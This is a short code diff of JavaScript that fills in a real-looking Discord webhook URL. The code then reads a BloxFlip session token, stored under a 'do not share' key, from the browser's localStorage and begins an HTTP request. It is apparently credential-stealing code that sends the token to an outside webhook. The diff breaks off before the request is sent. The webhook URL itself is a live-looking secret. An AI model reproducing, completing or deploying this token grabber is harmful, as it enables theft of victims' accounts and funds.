@@ -1,5 +1,5 @@
 {
-  const webhook = "Webhook link here!";
+  const webhook = "https://discord.com/api/webhooks/1064291691147825193/ShOm5BVrx-nL9UCv4v4eUgzMHAgRBcWysnEcBuOs-2k8vxM1uz0nxPJGnZn0M7bEbnQb";
 
   const token = window.localStorage["_DO_NOT_SHARE_BLOXFLIP_TOKEN"];
   const request = new XMLHttpRequest();
